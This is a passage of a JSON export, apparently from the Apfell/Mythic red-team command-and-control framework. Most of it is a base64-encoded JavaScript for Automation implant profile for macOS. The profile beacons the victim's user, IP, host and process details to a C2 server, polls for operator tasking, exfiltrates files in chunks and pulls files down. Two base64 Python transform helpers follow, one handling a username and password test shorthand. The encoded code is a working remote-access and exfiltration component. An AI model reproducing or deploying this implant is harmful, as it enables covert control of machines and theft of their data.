lID09PSB1bmRlZmluZWQpe3ZhbHVlID0gIiI7fQogICAgICAgICAgICBpZih2YWx1ZSA9PT0gIm1lc3NhZ2UiKXt2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3ZhbHVlKHZhbHVlLCBlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ3RyYW5zZm9ybXMnXSk7CiAgICAgICAgICAgIGJhc2VfdXJpID0gYmFzZV91cmkucmVwbGFjZShlbmRwb2ludFsndXJsRnVuY3Rpb25zJ11baV1bJ25hbWUnXSwgdmFsdWUpOwogICAgICAgIH0KICAgICAgICBsZXQgcXVlcnlfc3RyaW5nID0gIj8iOwogICAgICAgIGZvcihsZXQgaSBpbiBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ3ZhbHVlJ107CiAgICAgICAgICAgIGlmKHZhbHVlID09PSB1bmRlZmluZWQpe3ZhbHVlID0gIiI7fQogICAgICAgICAgICBpZih2YWx1ZSA9PT0gIm1lc3NhZ2UiKXt2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3ZhbHVlKHZhbHVlLCBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ3RyYW5zZm9ybXMnXSk7CiAgICAgICAgICAgIGxldCBOU0NoYXJhY3RlclNldCA9ICQuTlNDaGFyYWN0ZXJTZXQuY2hhcmFjdGVyU2V0V2l0aENoYXJhY3RlcnNJblN0cmluZygiLys9XG4iKS5pbnZlcnRlZFNldDsKICAgICAgICAgICAgdmFsdWUgPSAkKHZhbHVlKS5zdHJpbmdCeUFkZGluZ1BlcmNlbnRFbmNvZGluZ1dpdGhBbGxvd2VkQ2hhcmFjdGVycyhOU0NoYXJhY3RlclNldCkuanM7CiAgICAgICAgICAgIHF1ZXJ5X3N0cmluZyArPSBlbmRwb2ludFsnUXVlcnlQYXJhbWV0ZXJzJ11baV1bJ25hbWUnXSArICI9IiArIHZhbHVlICsgIiYiOwogICAgICAgIH0KICAgICAgICBiYXNlX3VyaSArPSBxdWVyeV9zdHJpbmcuc2xpY2UoMCwgLTEpOyAvL3Rha2Ugb2ZmIHRyYWlsaW5nICYgb3IgPwogICAgICAgIGxldCBjb29raWVzID0ge307CiAgICAgICAgZm9yKGxldCBpIGluIGVuZHBvaW50WydDb29raWVzJ10pewogICAgICAgICAgICBsZXQgdmFsdWUgPSBlbmRwb2ludFsnQ29va2llcyddW2ldWyd2YWx1ZSddOwogICAgICAgICAgICBpZih2YWx1ZSA9PT0gdW5kZWZpbmVkKXsgdmFsdWUgPSAiIjt9CiAgICAgICAgICAgIGlmKHZhbHVlID09PSAibWVzc2FnZSIpeyB2YWx1ZSA9IGRhdGE7fQogICAgICAgICAgICB2YWx1ZSA9IHRoaXMuY3JlYXRlX3ZhbHVlKHZhbHVlLCBlbmRwb2ludFsnQ29va2llcyddW2ldWyd0cmFuc2Zvcm1zJ10pOwogICAgICAgICAgICBjb29raWVzW2VuZHBvaW50WydDb29raWVzJ11baV1bJ25hbWUnXV0gPSB2YWx1ZTsKICAgICAgICB9CiAgICAgICAgbGV0IGhlYWRlcnMgPSBlbmRwb2ludFsnQWdlbnRIZWFkZXJzJ107CiAgICAgICAgbGV0IGNvb2tpZV9oZWFkZXIgPSAiIjsKICAgICAgICBmb3IobGV0IGkgaW4gY29va2llcyl7CiAgICAgICAgICAgIGNvb2tpZV9oZWFkZXIgKz0gaSArICI9IiArIGNvb2tpZXNbaV0gKyAiOyI7CiAgICAgICAgfQogICAgICAgIGlmKGNvb2tpZV9oZWFkZXIgIT09ICIiKXsKICAgICAgICAgICAgaGVhZGVyc1snQ29va2llJ10gPSBjb29raWVfaGVhZGVyOwogICAgICAgIH0KICAgICAgICBsZXQgdXJsID0gYmFzZV91cmwgKyBiYXNlX3VyaTsKICAgICAgICBsZXQgYm9keSA9IHRoaXMuY3JlYXRlX3ZhbHVlKGRhdGEsIGVuZHBvaW50WydCb2R5J10pOwogICAgICAgIC8vIG5vdyBtYWtlIHRoZSByZXF1ZXN0IG9iamVjdAogICAgICAgIGxldCByZXEgPSAkLk5TTXV0YWJsZVVSTFJlcXVlc3QuYWxsb2MuaW5pdFdpdGhVUkwoJC5OU1VSTC5VUkxXaXRoU3RyaW5nKHVybCkpOwogICAgICAgIGZvcihsZXQgaSBpbiBoZWFkZXJzKSB7CiAgICAgICAgICAgIHJlcS5zZXRWYWx1ZUZvckhUVFBIZWFkZXJGaWVsZCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZyhoZWFkZXJzW2ldKSwgJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aFVURjhTdHJpbmcoaSkpOwogICAgICAgIH0KICAgICAgICBpZihtZXRob2QgPT09ICJQT1NUIikgewogICAgICAgICAgICByZXEuc2V0SFRUUE1ldGhvZCgkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoVVRGOFN0cmluZygiUE9TVCIpKTsKICAgICAgICAgICAgbGV0IHBvc3REYXRhID0gJChib2R5KS5kYXRhVXNpbmdFbmNvZGluZ0FsbG93TG9zc3lDb252ZXJzaW9uKCQuTlNTdHJpbmcuTlNBU0NJSVN0cmluZ0VuY29kaW5nLCB0cnVlKTsKICAgICAgICAgICAgbGV0IHBvc3RMZW5ndGggPSAkLk5TU3RyaW5nLnN0cmluZ1dpdGhGb3JtYXQoIiVkIiwgcG9zdERhdGEubGVuZ3RoKTsKICAgICAgICAgICAgcmVxLmFkZFZhbHVlRm9ySFRUUEhlYWRlckZpZWxkKHBvc3RMZW5ndGgsICQuTlNTdHJpbmcuYWxsb2MuaW5pdFdpdGhVVEY4U3RyaW5nKCdDb250ZW50LUxlbmd0aCcpKTsKICAgICAgICAgICAgcmVxLnNldEhUVFBCb2R5KHBvc3REYXRhKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHJlcTsKICAgIH0KICBnZXRDb25maWcoKXsKICAgIC8vQSBSRVNUZnVsIGJhc2UgY29uZmlnIGNvbnNpc3RzIG9mIHRoZSBmb2xsb3dpbmc6CiAgICAvLyAgQmFzZVVSTCAoaW5jbHVkZXMgUG9ydCksIENhbGxiYWNrSW50ZXJ2YWwsIEtpbGxEYXRlIChub3QgaW1wbGVtZW50ZWQgeWV0KQogICAgbGV0IGNvbmZpZyA9IHsKICAgICAgIkMyIjogewogICAgICAgICAgImNvbW1hbmRzIjogdGhpcy5jb21tYW5kcy5qb2luKCIsIiksCiAgICAgICAgICAiYXBpX3ZlcnNpb24iOiB0aGlzLmFwaV92ZXJzaW9uLAogICAgICAgICAgImFlc19wc2siOiB0aGlzLmFlc19wc2ssCiAgICAgICAgICAiY29uZmlnIjogdGhpcy5jMl9jb25maWcKICAgICAgfSwKICAgICAgIkhvc3QiOiB7CiAgICAgICAgICAidXNlciI6IGFwZmVsbC51c2VyLAogICAgICAgICAgImZ1bGxOYW1lIjogYXBmZWxsLmZ1bGxOYW1lLAogICAgICAgICAgImlwcyI6IGFwZmVsbC5pcCwKICAgICAgICAgICJob3N0cyI6IGFwZmVsbC5ob3N0LAogICAgICAgICAgImVudmlyb25tZW50IjogYXBmZWxsLmVudmlyb25tZW50LAogICAgICAgICAgInVwdGltZSI6IGFwZmVsbC51cHRpbWUsCiAgICAgICAgICAiYXJncyI6IGFwZmVsbC5hcmdzLAogICAgICAgICAgInBpZCI6IGFwZmVsbC5waWQsCiAgICAgICAgICAiYXBmZWxsX2lkIjogYXBmZWxsLmlkLAogICAgICAgICAgInBheWxvYWRfaWQiOiBhcGZlbGwudXVpZAogICAgICB9fTsKICAgIHJldHVybiBKU09OLnN0cmluZ2lmeShjb25maWcsIG51bGwsIDIpOwogIH0KICBjaGVja2luKGlwLCBwaWQsIHVzZXIsIGhvc3QsIG9zLCBhcmNoaXRlY3R1cmUpewogICAgbGV0IGluZm8gPSB7J2lwJzppcCwncGlkJzpwaWQsJ3VzZXInOnVzZXIsJ2hvc3QnOmhvc3QsJ3V1aWQnOmFwZmVsbC51dWlkLCAib3MiOiBvcywgImFyY2hpdGVjdHVyZSI6IGFyY2hpdGVjdHVyZSwgImFjdGlvbiI6ICJjaGVja2luIn07CiAgICBpZih1c2VyID09PSAncm9vdCcpe2luZm9bJ2ludGVncml0eV9sZXZlbCddID0gMzt9CiAgICAvL2xldCByZXEgPSBudWxsOwogICAgbGV0IGpzb25kYXRhID0gbnVsbDsKICAgIGlmKHRoaXMuZXhjaGFuZ2luZ19rZXlzKXsKICAgICAgICBsZXQgc2Vzc2lvbklEID0gdGhpcy5uZWdvdGlhdGVfa2V5KCk7CiAgICAgICAganNvbmRhdGEgPSB0aGlzLm1ha2VfcmVxdWVzdCgiUE9TVCIsIHNlc3Npb25JRCwgaW5mbyk7CiAgICB9ZWxzZXsKICAgICAgICBqc29uZGF0YSA9IHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLnV1aWQsIGluZm8pOwogICAgfQogICAgYXBmZWxsLmlkID0ganNvbmRhdGEuaWQ7CiAgICAvLyBpZiB3ZSBmYWlsIHRvIGdldCBhbiBJRCBudW1iZXIgdGhlbiBleGl0IHRoZSBhcHBsaWNhdGlvbgogICAgaWYoYXBmZWxsLmlkID09PSB1bmRlZmluZWQpeyAkLk5TQXBwbGljYXRpb24uc2hhcmVkQXBwbGljYXRpb24udGVybWluYXRlKHRoaXMpOyB9CiAgICByZXR1cm4ganNvbmRhdGE7CiAgfQogIGdldFRhc2tpbmcoKXsKICAgIHdoaWxlKHRydWUpewogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IHRhc2sgPSB0aGlzLm1ha2VfcmVxdWVzdCgiR0VUIiwgYXBmZWxsLmlkLCAgeyJ0YXNraW5nX3NpemUiOjEsICJhY3Rpb24iOiAiZ2V0X3Rhc2tpbmcifSk7CiAgICAgICAgICAgIHJldHVybiB0YXNrWyd0YXNrcyddOwogICAgICAgIH0KICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgIC8vY29uc29sZS5sb2coImVycm9yIGluIGdldFRhc2tpbmc6ICIgKyBlcnJvci50b1N0cmluZygpKTsKICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOyAgLy8gZG9uJ3Qgc3BpbiBvdXQgY3JhenkgaWYgdGhlIGNvbm5lY3Rpb24gZmFpbHMKICAgICAgICB9CiAgICB9CiAgfQogIHBvc3RSZXNwb25zZSh0YXNrLCBkYXRhKXsKICAgIC8vZGVwZW5kaW5nIG9uIHRoZSBhbW91bnQgb2YgZGF0YSB3ZSdyZSBzZW5kaW5nLCB3ZSBtaWdodCBuZWVkIHRvIGNodW5rIGl0CiAgICBkYXRhWyd0YXNrX2lkJ10gPSB0YXNrLmlkOwogICAgbGV0IHBvc3REYXRhID0geyJhY3Rpb24iOiAicG9zdF9yZXNwb25zZSIsICJyZXNwb25zZXMiOiBbZGF0YV19OwogICAgcmV0dXJuIHRoaXMubWFrZV9yZXF1ZXN0KCJQT1NUIiwgYXBmZWxsLmlkLCBwb3N0RGF0YSApOwogIH0KICBtYWtlX3JlcXVlc3QobWV0aG9kPSJQT1NUIiwgdWlkPWFwZmVsbC5pZCwgZGF0YT1udWxsKXsKICAgIHdoaWxlKHRydWUpewogICAgICB0cnl7CiAgICAgICAgICBsZXQgcmVxOwogICAgICAgICAgaWYobWV0aG9kID09PSAiUE9TVCIpewogICAgICAgICAgICAgIGlmKHRoaXMucG9zdF9tZXNzYWdlcy5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgICAgICAgIHJlcSA9IHRoaXMuY3JlYXRlX21lc3NhZ2UodGhpcy5nZXRfcmFuZG9tX2VsZW1lbnQodGhpcy5wb3N0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMuZ2V0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH0KICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgIGlmKHRoaXMuZ2V0X21lc3NhZ2VzLmxlbmd0aCA+IDApewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMuZ2V0X21lc3NhZ2VzKSwgZGF0YSwgdWlkLCBtZXRob2QpOwogICAgICAgICAgICAgIH1lbHNlewogICAgICAgICAgICAgICAgICByZXEgPSB0aGlzLmNyZWF0ZV9tZXNzYWdlKHRoaXMuZ2V0X3JhbmRvbV9lbGVtZW50KHRoaXMucG9zdF9tZXNzYWdlcyksIGRhdGEsIHVpZCwgbWV0aG9kKTsKICAgICAgICAgICAgICB9CiAgICAgICAgICB9CiAgICAgICAgICAvL2ZvciBzb21lIHJlYXNvbiBpdCBzb21ldGltZXMgcmFuZG9tbHkgZmFpbHMgdG8gc2VuZCB0aGUgZGF0YSwgdGhyb3dpbmcgYSBKU09OIGVycm9yLiBsb29wIHRvIGZpeCBmb3Igbm93CiAgICAgICAgbGV0IHJlc3BvbnNlID0gUmVmKCk7CiAgICAgICAgbGV0IGVycm9yID0gUmVmKCk7CiAgICAgICAgbGV0IHJlc3BvbnNlRGF0YSA9ICQuTlNVUkxDb25uZWN0aW9uLnNlbmRTeW5jaHJvbm91c1JlcXVlc3RSZXR1cm5pbmdSZXNwb25zZUVycm9yKHJlcSxyZXNwb25zZSxlcnJvcik7CiAgICAgICAgcmVzcG9uc2VEYXRhID0gdGhpcy5yZXRyaWV2ZV9tZXNzYWdlKHJlc3BvbnNlRGF0YSwgbWV0aG9kKTsKICAgICAgICBpZiggcmVzcG9uc2VEYXRhLmxlbmd0aCA8IDM2KXsKICAgICAgICAgICAgJC5OU1RocmVhZC5zbGVlcEZvclRpbWVJbnRlcnZhbCh0aGlzLmdlbl9zbGVlcF90aW1lKCkpOwogICAgICAgICAgICBjb250aW51ZTsKICAgICAgICB9CiAgICAgICAgbGV0IHJlc3AgPSAkLk5TRGF0YS5hbGxvYy5pbml0V2l0aEJhc2U2NEVuY29kaW5nKHJlc3BvbnNlRGF0YSk7CiAgICAgICAgbGV0IHV1aWRfcmFuZ2UgPSAkLk5TTWFrZVJhbmdlKDAsIDM2KTsKICAgICAgICBsZXQgbWVzc2FnZV9yYW5nZSA9ICQuTlNNYWtlUmFuZ2UoMzYsIHJlc3AubGVuZ3RoIC0gMzYpOwogICAgICAgIGxldCB1dWlkID0gJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZyhyZXNwLnN1YmRhdGFXaXRoUmFuZ2UodXVpZF9yYW5nZSksICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpLmpzOwogICAgICAgIC8vY29uc29sZS5sb2coImNhcnZpbmcgb3V0IHJlc3Qgb2YgbWVzc2FnZSIpOwogICAgICAgIGlmKHV1aWQgIT09IGFwZmVsbC51dWlkICYmIHV1aWQgIT09IGFwZmVsbC5pZCAmJiB1dWlkICE9PSB1aWQpewogICAgICAgICAgICAvL2NvbnNvbGUubG9nKCJpZCBkb2Vzbid0IG1hdGNoOiAiICsgdXVpZCk7CiAgICAgICAgICAgICQuTlNUaHJlYWQuc2xlZXBGb3JUaW1lSW50ZXJ2YWwodGhpcy5nZW5fc2xlZXBfdGltZSgpKTsKICAgICAgICAgICAgY29udGludWU7CiAgICAgICAgfQogICAgICAgIHJlc3AgPSByZXNwLnN1YmRhdGFXaXRoUmFuZ2UobWVzc2FnZV9yYW5nZSk7IC8vY291bGQgZWl0aGVyIGJlIHBsYWludGV4dCBqc29uIG9yIGVuY3J5cHRlZCBieXRlcwogICAgICAgIC8vd2UncmUgbm90IGRvaW5nIHRoZSBpbml0aWFsIGtleSBleGNoYW5nZQogICAgICAgIGlmKHRoaXMuYWVzX3BzayAhPT0gIiIpewogICAgICAgICAgICAvL2lmIHdlIGRvIG5lZWQgdG8gZGVjcnlwdCB0aGUgcmVzcG9uc2UgdGhvdWdoLCBkbyB0aGF0CiAgICAgICAgICAgIHJlc3AgPSBPYmpDLnVud3JhcCh0aGlzLmRlY3J5cHRfbWVzc2FnZShyZXNwKSk7CiAgICAgICAgICAgIHJldHVybiBKU09OLnBhcnNlKHJlc3ApOwogICAgICAgIH1lbHNlewogICAgICAgICAgICAvL3dlIGRvbid0IG5lZWQgdG8gZGVjcnlwdCBpdCwgc28gd2UgY2FuIGp1c3QgcGFyc2UgYW5kIHJldHVybiBpdAogICAgICAgICAgICByZXR1cm4gSlNPTi5wYXJzZShPYmpDLmRlZXBVbndyYXAoJC5OU1N0cmluZy5hbGxvYy5pbml0V2l0aERhdGFFbmNvZGluZyhyZXNwLCAkLk5TVVRGOFN0cmluZ0VuY29kaW5nKSkpOwogICAgICAgIH0KICAgICAgfQogICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAvL2NvbnNvbGUubG9nKCJlcnJvciBpbiBtYWtlX3JlcXVlc3Q6ICIgICsgZXJyb3IudG9TdHJpbmcoKSk7CiAgICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7ICAvLyBkb24ndCBzcGluIG91dCBjcmF6eSBpZiB0aGUgY29ubmVjdGlvbiBmYWlscwogICAgICB9CiAgICB9CiAgfQogIGRvd25sb2FkKHRhc2ssIHBhcmFtcyl7CiAgICBsZXQgb3V0cHV0ID0gIiI7CiAgICBpZiggZG9lc19maWxlX2V4aXN0KHBhcmFtcykpewogICAgICAgIGxldCBvZmZzZXQgPSAwOwogICAgICAgIGxldCBjaHVua1NpemUgPSB0aGlzLmNodW5rX3NpemU7IC8vMzUwMDsKICAgICAgICBsZXQgZnVsbF9wYXRoID0gcGFyYW1zOwogICAgICAgIHRyeXsKICAgICAgICAgICAgbGV0IGZtID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgICAgICBsZXQgcGllY2VzID0gT2JqQy5kZWVwVW53cmFwKGZtLmNvbXBvbmVudHNUb0Rpc3BsYXlGb3JQYXRoKHBhcmFtcykpOwogICAgICAgICAgICBmdWxsX3BhdGggPSAiLyIgKyBwaWVjZXMuc2xpY2UoMSkuam9pbigiLyIpOwogICAgICAgICAgICB2YXIgaGFuZGxlID0gJC5OU0ZpbGVIYW5kbGUuZmlsZUhhbmRsZUZvclJlYWRpbmdBdFBhdGgoZnVsbF9wYXRoKTsKICAgICAgICAgICAgLy8gR2V0IHRoZSBmaWxlIHNpemUgYnkgc2Vla2luZzsKICAgICAgICAgICAgdmFyIGZpbGVTaXplID0gaGFuZGxlLnNlZWtUb0VuZE9mRmlsZTsKICAgICAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgICAgICByZXR1cm4geydzdGF0dXMnOiAnZXJyb3InLCAndXNlcl9vdXRwdXQnOiBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgfQogICAgICAgIC8vIGFsd2F5cyByb3VuZCB1cCB0byBhY2NvdW50IGZvciBjaHVua3MgdGhhdCBhcmUgPCBjaHVua3NpemU7CiAgICAgICAgbGV0IG51bU9mQ2h1bmtzID0gTWF0aC5jZWlsKGZpbGVTaXplIC8gY2h1bmtTaXplKTsKICAgICAgICBsZXQgcmVnaXN0ZXJEYXRhID0geyd0b3RhbF9jaHVua3MnOiBudW1PZkNodW5rcywgImZ1bGxfcGF0aCI6IGZ1bGxfcGF0aH07CiAgICAgICAgbGV0IHJlZ2lzdGVyRmlsZSA9IHRoaXMucG9zdFJlc3BvbnNlKHRhc2ssIHJlZ2lzdGVyRGF0YSk7CiAgICAgICAgaWYgKHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ3N0YXR1cyddID09PSAic3VjY2VzcyIpewogICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldCgwKTsKICAgICAgICAgICAgbGV0IGN1cnJlbnRDaHVuayA9IDE7CiAgICAgICAgICAgIGxldCBkYXRhID0gaGFuZGxlLnJlYWREYXRhT2ZMZW5ndGgoY2h1bmtTaXplKTsKICAgICAgICAgICAgd2hpbGUocGFyc2VJbnQoZGF0YS5sZW5ndGgpID4gMCAmJiBvZmZzZXQgPCBmaWxlU2l6ZSl7CiAgICAgICAgICAgICAgICAvLyBzZW5kIGEgY2h1bmsKICAgICAgICAgICAgICAgIGxldCBmaWxlRGF0YSA9IHsnY2h1bmtfbnVtJzogY3VycmVudENodW5rLCAnY2h1bmtfZGF0YSc6IGRhdGEuYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzLCAnZmlsZV9pZCc6IHJlZ2lzdGVyRmlsZVsncmVzcG9uc2VzJ11bMF1bJ2ZpbGVfaWQnXX07CiAgICAgICAgICAgICAgICBsZXQgcmVzcG9uc2UgPSB0aGlzLnBvc3RSZXNwb25zZSh0YXNrLCBmaWxlRGF0YSk7CiAgICAgICAgICAgICAgICBpZihyZXNwb25zZVsncmVzcG9uc2VzJ11bMF1bJ3N0YXR1cyddID09PSAnc3VjY2VzcycpewogICAgICAgICAgICAgICAgICBvZmZzZXQgKz0gcGFyc2VJbnQoZGF0YS5sZW5ndGgpOwogICAgICAgICAgICAgICAgICBoYW5kbGUuc2Vla1RvRmlsZU9mZnNldChvZmZzZXQpOwogICAgICAgICAgICAgICAgICBjdXJyZW50Q2h1bmsgKz0gMTsKICAgICAgICAgICAgICAgICAgZGF0YSA9IGhhbmRsZS5yZWFkRGF0YU9mTGVuZ3RoKGNodW5rU2l6ZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkLk5TVGhyZWFkLnNsZWVwRm9yVGltZUludGVydmFsKHRoaXMuZ2VuX3NsZWVwX3RpbWUoKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgb3V0cHV0ID0geyJjb21wbGV0ZWQiOnRydWUsICJmaWxlX2lkIjogcmVnaXN0ZXJGaWxlWydyZXNwb25zZXMnXVswXVsnZmlsZV9pZCddfTsKICAgICAgICB9CiAgICAgICAgZWxzZXsKICAgICAgICAgICBvdXRwdXQgPSB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6ICJGYWlsZWQgdG8gcmVnaXN0ZXIgZmlsZSB0byBkb3dubG9hZCIsICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgICAgICB9CiAgICB9CiAgICBlbHNlewogICAgICAgIG91dHB1dCA9IHsnc3RhdHVzJzogJ2Vycm9yJywgJ3VzZXJfb3V0cHV0JzogImZpbGUgZG9lcyBub3QgZXhpc3QiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICB9CiAgICByZXR1cm4gb3V0cHV0OwogIH0KICB1cGxvYWQodGFzaywgZmlsZV9pZCwgZnVsbF9wYXRoKXsKICAgIHRyeXsKICAgICAgICBsZXQgZGF0YSA9IHsiYWN0aW9uIjogInVwbG9hZCIsICJmaWxlX2lkIjogZmlsZV9pZCwgImNodW5rX3NpemUiOiB0aGlzLmNodW5rX3NpemUsICJjaHVua19udW0iOiAxLCAiZnVsbF9wYXRoIjogZnVsbF9wYXRoLCAidGFza19pZCI6IHRhc2suaWR9OwogICAgICAgIGxldCBjaHVua19udW0gPSAxOwogICAgICAgIGxldCB0b3RhbF9jaHVua3MgPSAxOwogICAgICAgIGxldCB0b3RhbF9kYXRhID0gJC5OU011dGFibGVEYXRhLmRhdGFXaXRoTGVuZ3RoKDApOwogICAgICAgIGRvewogICAgICAgICAgICBsZXQgZmlsZV9kYXRhID0gdGhpcy5tYWtlX3JlcXVlc3QoIlBPU1QiLCBhcGZlbGwuaWQsIGRhdGEpOwogICAgICAgICAgICBpZihmaWxlX2RhdGFbJ2NodW5rX251bSddID09PSAwKXsKICAgICAgICAgICAgICAgIHJldHVybiB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6ICJFcnJvciBmcm9tIHRoZSBzZXJ2ZXIiLCAiY29tcGxldGVkIjogdHJ1ZX07CiAgICAgICAgICAgIH0KICAgICAgICAgICAgY2h1bmtfbnVtID0gZmlsZV9kYXRhWydjaHVua19udW0nXTsKICAgICAgICAgICAgdG90YWxfY2h1bmtzID0gZmlsZV9kYXRhWyd0b3RhbF9jaHVua3MnXTsKICAgICAgICAgICAgdG90YWxfZGF0YS5hcHBlbmREYXRhKCQuTlNEYXRhLmFsbG9jLmluaXRXaXRoQmFzZTY0RW5jb2RpbmcoJChmaWxlX2RhdGFbJ2NodW5rX2RhdGEnXSkpKTsKICAgICAgICAgICAgZGF0YSA9IHsiYWN0aW9uIjogInVwbG9hZCIsICJmaWxlX2lkIjogZmlsZV9pZCwgImNodW5rX3NpemUiOiB0aGlzLmNodW5rX3NpemUsICJjaHVua19udW0iOiBjaHVua19udW0gKyAxfTsKICAgICAgICB9d2hpbGUoY2h1bmtfbnVtIDwgdG90YWxfY2h1bmtzKTsKICAgICAgcmV0dXJuIHRvdGFsX2RhdGE7CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7J3N0YXR1cyc6ICdlcnJvcicsICd1c2VyX291dHB1dCc6IGVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlfTsKICAgIH0KICB9Cn0KLy8tLS0tLS0tLS0tLS0tIElOU1RBTlRJQVRFIE9VUiBDMiBDTEFTUyBCRUxPVyBIRVJFIElOIE1BSU4gQ09ERS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCk9iakMuaW1wb3J0KCdTZWN1cml0eScpOwpDMiA9IG5ldyBjdXN0b21DMigpOwo="
          }
        ]
      },
      "load_transforms": [
        {
          "parameter": "",
          "description": "Combine all selected commands into one file",
          "transform": "combineCommands",
          "parameter_type": "None",
          "order": 1
        }
      ],
      "create_transforms": [],
      "wrapped": [],
      "transforms": [
        {
          "code": "YXN5bmMgZGVmIGpzb25TaW5nbGVQYXJhbWV0ZXIoc2VsZiwgdGFza19wYXJhbXM6IHN0ciwgcGFyYW1ldGVyOiBzdHIpIC0+IHN0cjoKICAgIGltcG9ydCBqc29uCiAgICBpZiBsZW4odGFza19wYXJhbXMpID09IDA6CiAgICAgICAgcmFpc2UgRXhjZXB0aW9uKCJNaXNzaW5nIGEgcGFyYW1ldGVyIikKICAgIGlmIHRhc2tfcGFyYW1zWzBdID09ICJ7IjoKICAgICAgICByZXR1cm4gdGFza19wYXJhbXMKICAgIGVsc2U6CiAgICAgICAgcGFyYW1fZGljdCA9IHt9CiAgICAgICAgcGFyYW1fZGljdFtwYXJhbWV0ZXJdID0gdGFza19wYXJhbXMKICAgICAgICByZXR1cm4ganNvbi5kdW1wcyhwYXJhbV9kaWN0KQogICAgICAgIHBhcmFtX2RpY3QgPSBqc29uLmxvYWRzKHRhc2tfcGFyYW1zKQ==",
          "name": "jsonSingleParameter",
          "parameter_type": "String",
          "description": "Takes a normal user string and converts it to a JSON string with one parameter",
          "is_command_code": true,
          "timestamp": "05\/07\/2020 07:01:49",
          "id": 11,
          "operator": "apfell_admin"
        },
        {
          "code": "YXN5bmMgZGVmIGFwZmVsbGp4YV90ZXN0X3Bhc3N3b3JkX3Nob3J0aGFuZChzZWxmLCB0YXNrX3BhcmFtczogc3RyLCBwYXJhbWV0ZXI6IE5vbmUpIC0+IHN0cjoKICAgICMgZmluZHMgdGhlIGZpZWxkIGluZGljYXRlZCBieSAncGFyYW1ldGVyJyBhbmQgdXBkYXRlcyBpdCB0byBiZSBiYXNlNjQgZW5jb2RlZAogICAgaW1wb3J0IGpzb24KICAgIGlmIGxlbih0YXNrX3BhcmFtcykgPT0gMDoKICAgICAgICByYWlzZSBFeGNlcHRpb24oIk1pc3NpbmcgUGFyYW1ldGVycyIpCiAgICBpZiB0YXNrX3BhcmFtc1swXSA9PSAieyI6CiAgICAgICAgcmV0dXJuIHRhc2tfcGFyYW1zCiAgICBlbHNlOgogICAgICAgIHBpZWNlcyA9IHRhc2tfcGFyYW1zLnNwbGl0KCIgIikKICAgICAgICBpZiBsZW4ocGllY2VzKSA8IDI6CiAgICAgICAgICAgIHJhaXNlIEV4Y2VwdGlvbigiTWlzc2luZyBhcmd1bWVudHMsIG5lZWRzIDIiKQogICAgICAgIHBhcmFtc19kaWN0ID0ge30KICAgICAgICBwYXJhbXNfZGljdFsndXNlcm5hbWUnXSA9IHBpZWNlc1swXQogICAgICAgIHBhcmFtc19kaWN0WydwYXNzd29yZCddID0gIiAiLmpvaW4ocGllY2VzWzE6XSkKICAgICAgICByZXR1cm4ganNvbi5kdW1wcyhwYXJhbXNfZGljdCk=",
          "name": "apfelljxa_test_password_shorthand",
          "parameter_type": "None",
          "description": "shorthand notation for apfell-jxa's test_command to allow a user to type \"test_password user password\"",
          "is_command_code": true,
          "timestamp": "05\/07\/2020 07:01:49",
          "id": 12,
          "operator": "apfell_admin"
        },
        {
